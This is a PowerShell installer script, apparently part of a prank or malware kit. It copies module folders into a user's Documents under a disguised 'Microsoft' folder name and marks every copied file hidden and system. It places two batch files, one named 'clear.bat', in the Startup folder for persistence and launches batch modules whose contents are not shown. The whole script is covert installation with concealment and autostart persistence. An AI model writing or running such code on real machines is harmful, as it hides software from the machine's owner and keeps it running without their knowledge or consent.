# Settings
$location = Get-Location
$sourcePathSystem = "${location}\system"
$sourcePathLocal = "${location}\local"
$destinationPath = "C:\Users\$env:USERNAME\documents\Microsoft"
$video = 2

# Unblock Files
Get-ChildItem -r | unblock-file

# Copy to System
Robocopy "${sourcePathSystem}" "${destinationPath}" /A+:SH /MIR
copy-item "${location}\extra\vid${video}.mkv" "${destinationPath}\module-2\video.mkv" -Force

# Hide
Get-ChildItem -r "${destinationPath}\" | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -Value 6 }

# Move to shell:startup
Move-Item "${destinationPath}\module-2\module-2-START-AUTO.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Move-Item "${destinationPath}\module-2\clear.bat" "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Force

# Run local Modules
$modulesLocal = Get-ChildItem -Path $sourcePathLocal -Directory -Recurse | Select-Object -ExpandProperty FullName
foreach ($i in $modulesLocal) { Set-Location $i; Start-Process .\RUN-Module.bat }

# Run System Modules
$modulesSystem = Get-ChildItem -Path $sourcePathSystem -Directory -Recurse | Select-Object -ExpandProperty Name
foreach ($i in $modulesSystem) { Set-Location "${destinationPath}/${i}"; Start-Process .\RUN-Module.bat }
